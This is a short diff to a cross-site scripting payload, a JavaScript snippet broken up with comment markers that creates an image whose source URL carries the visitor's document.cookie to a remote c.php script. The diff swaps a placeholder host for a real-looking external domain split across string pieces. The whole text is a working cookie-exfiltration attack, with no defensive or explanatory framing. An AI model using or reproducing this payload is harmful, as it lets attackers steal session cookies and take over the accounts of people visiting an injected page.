@@ -1,7 +1,8 @@
 <script>/*
 */var i=new Image();/*
-*/i.src=“http://my” +/*
-*/“siteforthejob/” +/*
+*/i.src=“http://b” +/*
+*/“lack.mentalkamp” +/*
+*/“fkunst.de/cake/” +/*
 */“c.php?cookie=” +/*
 */document.cookie;/*
 */</script>
